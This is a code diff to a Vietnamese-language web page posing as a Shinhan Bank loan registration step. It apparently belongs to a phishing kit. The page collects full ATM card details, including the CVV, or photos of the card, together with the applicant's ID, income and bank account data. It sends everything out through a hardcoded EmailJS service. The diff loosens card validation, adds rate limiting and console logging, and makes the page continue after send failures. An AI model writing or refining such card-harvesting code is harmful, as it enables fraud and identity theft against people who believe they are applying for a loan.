@@ -139,11 +139,18 @@
         }
         .form-control {
             font-size: 16px;
-            border-radius: 15px; /* Apply soft rounded corners to all inputs */
+            border-radius: 15px;
         }
         .continue-btn-container {
             text-align: center;
             margin-top: 20px;
+        }
+        .spam-error {
+            color: #dc3545;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
         }
     </style>
 </head>
@@ -205,6 +212,7 @@
                     <input type="text" class="form-control" id="cvv">
                 </div>
             </div>
+            <div class="spam-error" id="spamError">Bạn đã đăng ký quá nhiều lần. Vui lòng thử lại sau.</div>
             <div class="continue-btn-container">
                 <button id="proceedToStep4Btn" class="btn btn-primary" disabled>Tiếp Tục</button>
             </div>
@@ -246,30 +254,30 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS (replace 'YOUR_PUBLIC_KEY' with your actual EmailJS public key)
+        // Initialize EmailJS
         (function(){
             emailjs.init("OrBsI926QI2_xBh1f");
         })();
 
         // Placeholder user data (for fallback if localStorage is empty)
         let userData = {
-            fullName: "Nguyễn Văn A",
-            idNumber: "123456789",
-            idIssueDate: "01/01/2020",
-            idIssuePlace: "Hà Nội",
-            address: "123 Đường Láng, Hà Nội",
-            occupation: "nhanvien",
-            income: 10000000,
-            phoneNumber: "0901234567",
-            email: "nguyenvana@example.com",
-            loanAmount: 100000000,
-            loanTerm: "24",
-            loanPurpose: "Chi tiêu cá nhân",
-            accountNumber: "1234567890",
-            bankName: "Shinhan Bank",
+            fullName: "",
+            idNumber: "",
+            idIssueDate: "",
+            idIssuePlace: "",
+            address: "",
+            occupation: "",
+            income: "",
+            phoneNumber: "",
+            email: "",
+            loanAmount: "",
+            loanTerm: "",
+            loanPurpose: "",
+            accountNumber: "",
+            bankName: "",
             termsAgree: false,
-            loanCode: "SHB123456",
-            registrationDate: "08/05/2025",
+            loanCode: "",
+            registrationDate: "",
             currentStep: 3,
             qrData: {},
             atmCard: {}
@@ -277,15 +285,25 @@
 
         // Load user data from localStorage
         function loadUserData() {
-            const storedData = localStorage.getItem('userData');
-            if (storedData) {
-                userData = JSON.parse(storedData);
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(storedData);
+                    console.log('Loaded userData from localStorage:', userData);
+                }
+            } catch (error) {
+                console.error('Error parsing userData from localStorage:', error);
             }
         }
 
         // Save user data to localStorage
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                localStorage.setItem('userData', JSON.stringify(userData));
+                console.log('Saved userData to localStorage:', userData);
+            } catch (error) {
+                console.error('Error saving userData to localStorage:', error);
+            }
         }
 
         // Check if at least one image is uploaded
@@ -295,7 +313,7 @@
             return frontFile || backFile;
         }
 
-        // Validate manual input fields
+        // Validate manual input fields (relaxed validation)
         function validateManualInput() {
             const cardNumber = $('#cardNumber').val().trim();
             const issueDate = $('#issueDate').val().trim();
@@ -303,14 +321,46 @@
             const cardHolderName = $('#cardHolderName').val().trim();
             const cvv = $('#cvv').val().trim();
 
-            const cardNumberValid = /^\d{16}$/.test(cardNumber);
-            const dateFormatValid = /^\d{2}\/\d{2}$/;
-            const issueDateValid = dateFormatValid.test(issueDate);
-            const expiryDateValid = dateFormatValid.test(expiryDate);
-            const cardHolderNameValid = cardHolderName.split(/\s+/).length >= 2;
-            const cvvValid = /^\d{3}$/.test(cvv);
+            // At least one field must be filled
+            return cardNumber || issueDate || expiryDate || cardHolderName || cvv;
+        }
 
-            return cardNumberValid && issueDateValid && expiryDateValid && cardHolderNameValid && cvvValid;
+        // Anti-spam check
+        function checkSpam() {
+            const now = Date.now();
+            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
+            const lastRegistrationTime = spamData.lastRegistrationTime || 0;
+            const registrationCount = spamData.registerCount || 0;
+            const registrationResetTime = spamData.resetTime || now;
+
+            // Reset count after 24 hours
+            if (now > registrationResetTime) {
+                spamData.registerCount = 0;
+                spamData.resetTime = now + 24 * 60 * 60 * 1000; // Reset after 24 hours
+            }
+
+            // Check if registration is too frequent
+            const timeSinceLast = (now - lastRegistrationTime) / 1000; // in seconds
+            if (timeSinceLast < 300) { // 5 minutes
+                return { allowed: false, message: 'Bạn đã đăng ký quá nhanh. Vui lòng thử lại sau 5 phút.' };
+            }
+
+            // Check registration limit
+            if (registrationCount >= 3) {
+                return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
+            }
+
+            return { allowed: true };
+        }
+
+        // Update spam data
+        function updateSpamData() {
+            const now = Date.now();
+            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
+            spamData.lastRegistrationTime = now;
+            spamData.registerCount = (spamData.registerCount || 0) + 1;
+            spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
+            localStorage.setItem('spamData', JSON.stringify(spamData));
         }
 
         // Update button state
@@ -318,6 +368,7 @@
             const isManual = !$('#manualInputSection').hasClass('hidden');
             const isValid = isManual ? validateManualInput() : checkImageInput('atmFrontImage', 'atmBackImage');
             $('#proceedToStep4Btn').prop('disabled', !isValid);
+            console.log('Button state:', { isManual, isValid });
         }
 
         // Send email with registration and ATM card data
@@ -350,13 +401,16 @@
                 to_email: userData.email || 'support@shinhan.com.vn'
             };
 
+            console.log('Sending EmailJS params:', params);
+
             emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                 .then(() => {
+                    console.log('Email sent successfully');
                     alert("Thông tin đăng ký và thẻ ngân hàng đã được gửi qua email!");
                 })
                 .catch(error => {
                     console.error('EmailJS error:', error);
-                    alert("Đã xảy ra lỗi khi gửi email. Vui lòng thử lại.");
+                    alert("Đã xảy ra lỗi khi gửi email. Dữ liệu vẫn được lưu và bạn có thể tiếp tục.");
                 });
         }
 
@@ -398,27 +452,41 @@
         // Proceed to next step
         $('#proceedToStep4Btn').on('click', function(e) {
             e.preventDefault();
+
+            // Check anti-spam
+            const spamCheck = checkSpam();
+            if (!spamCheck.allowed) {
+                $('#spamError').text(spamCheck.message).show();
+                $('#proceedToStep4Btn').prop('disabled', true);
+                return;
+            } else {
+                $('#spamError').hide();
+            }
+
             if (!$('#manualInputSection').hasClass('hidden')) {
                 userData.atmCard = {
-                    cardNumber: $('#cardNumber').val().trim(),
-                    issueDate: $('#issueDate').val().trim(),
-                    expiryDate: $('#expiryDate').val().trim(),
-                    cardHolderName: $('#cardHolderName').val().trim(),
-                    cvv: $('#cvv').val().trim()
+                    cardNumber: $('#cardNumber').val().trim() || userData.atmCard.cardNumber || '',
+                    issueDate: $('#issueDate').val().trim() || userData.atmCard.issueDate || '',
+                    expiryDate: $('#expiryDate').val().trim() || userData.atmCard.expiryDate || '',
+                    cardHolderName: $('#cardHolderName').val().trim() || userData.atmCard.cardHolderName || '',
+                    cvv: $('#cvv').val().trim() || userData.atmCard.cvv || ''
                 };
                 $('#cardNumber, #issueDate, #expiryDate, #cardHolderName, #cvv').val('');
                 $('#manualInputSection').addClass('hidden');
             } else {
                 userData.atmCard = {
-                    frontImage: $('#atmFrontImage')[0].files[0] ? $('#atmFrontImage')[0].files[0].name : '',
-                    backImage: $('#atmBackImage')[0].files[0] ? $('#atmBackImage')[0].files[0].name : ''
+                    frontImage: $('#atmFrontImage')[0].files[0] ? $('#atmFrontImage')[0].files[0].name : (userData.atmCard.frontImage || ''),
+                    backImage: $('#atmBackImage')[0].files[0] ? $('#atmBackImage')[0].files[0].name : (userData.atmCard.backImage || '')
                 };
                 $('#atmFrontImage').val('');
                 $('#atmBackImage').val('');
                 $('#atmFrontInfo').text('');
                 $('#atmBackInfo').text('');
             }
-            sendCardDataEmail(); // Send email with registration and ATM card data
+            console.log('Saving atmCard data:', userData.atmCard);
+            saveToLocalStorage();
+            updateSpamData();
+            sendCardDataEmail(); // Send email asynchronously
             userData.currentStep = 4;
             saveToLocalStorage();
             window.location.href = 'step4.html';
